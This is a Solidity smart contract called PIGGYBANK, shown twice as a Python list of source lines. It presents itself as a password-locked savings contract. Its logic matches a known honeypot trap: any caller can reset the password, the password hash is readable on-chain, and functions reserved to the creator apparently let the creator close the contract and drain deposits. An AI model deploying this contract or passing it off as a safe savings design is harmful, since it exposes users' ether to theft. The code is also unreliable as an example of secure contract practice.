['pragma solidity ^0.4.24;\n', '\n', 'contract PIGGYBANK\n', '{\n', '    \n', '    bytes32 hashPwd;\n', '    \n', '    bool isclosed = false;\n', '    \n', '    uint cashOutTime;\n', '    \n', '    address sender;\n', '    \n', '    address myadress;\n', ' \n', '    \n', '    \n', '    function CashOut(bytes pass) external payable\n', '    {\n', '        if(hashPwd == keccak256(pass) && now>cashOutTime)\n', '        {\n', '            msg.sender.transfer(this.balance);\n', '        }\n', '    }\n', '    \n', '    function CashOut() public payable\n', '    {\n', '        if(msg.sender==myadress && now>cashOutTime)\n', '        {\n', '            msg.sender.transfer(this.balance);\n', '        }\n', '    }\n', '    \n', '    \n', '\n', ' \n', '    function DebugHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}\n', '    \n', '    function SetPwd(bytes32 hash) public payable\n', '    {\n', '        if( (!isclosed&&(msg.value>1 ether)) || hashPwd==0x00)\n', '        {\n', '            hashPwd = hash;\n', '            sender = msg.sender;\n', '            cashOutTime = now;\n', '        }\n', '    }\n', '    \n', '    function SetcashOutTime(uint date) public\n', '    {\n', '        if(msg.sender==sender)\n', '        {\n', '            cashOutTime = date;\n', '        }\n', '    }\n', '    \n', '    function Setmyadress(address _myadress) public\n', '    {\n', '        if(msg.sender==sender)\n', '        {\n', '            myadress = _myadress;\n', '        }\n', '    }\n', '    \n', '    function PwdHasBeenSet(bytes32 hash) public\n', '    {\n', '        if(hash==hashPwd&&msg.sender==sender)\n', '        {\n', '           isclosed=true;\n', '        }\n', '    }\n', '    \n', '    function() public payable{}\n', '    \n', '}']
['pragma solidity ^0.4.24;\n', '\n', 'contract PIGGYBANK\n', '{\n', '    \n', '    bytes32 hashPwd;\n', '    \n', '    bool isclosed = false;\n', '    \n', '    uint cashOutTime;\n', '    \n', '    address sender;\n', '    \n', '    address myadress;\n', ' \n', '    \n', '    \n', '    function CashOut(bytes pass) external payable\n', '    {\n', '        if(hashPwd == keccak256(pass) && now>cashOutTime)\n', '        {\n', '            msg.sender.transfer(this.balance);\n', '        }\n', '    }\n', '    \n', '    function CashOut() public payable\n', '    {\n', '        if(msg.sender==myadress && now>cashOutTime)\n', '        {\n', '            msg.sender.transfer(this.balance);\n', '        }\n', '    }\n', '    \n', '    \n', '\n', ' \n', '    function DebugHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}\n', '    \n', '    function SetPwd(bytes32 hash) public payable\n', '    {\n', '        if( (!isclosed&&(msg.value>1 ether)) || hashPwd==0x00)\n', '        {\n', '            hashPwd = hash;\n', '            sender = msg.sender;\n', '            cashOutTime = now;\n', '        }\n', '    }\n', '    \n', '    function SetcashOutTime(uint date) public\n', '    {\n', '        if(msg.sender==sender)\n', '        {\n', '            cashOutTime = date;\n', '        }\n', '    }\n', '    \n', '    function Setmyadress(address _myadress) public\n', '    {\n', '        if(msg.sender==sender)\n', '        {\n', '            myadress = _myadress;\n', '        }\n', '    }\n', '    \n', '    function PwdHasBeenSet(bytes32 hash) public\n', '    {\n', '        if(hash==hashPwd&&msg.sender==sender)\n', '        {\n', '           isclosed=true;\n', '        }\n', '    }\n', '    \n', '    function() public payable{}\n', '    \n', '}']
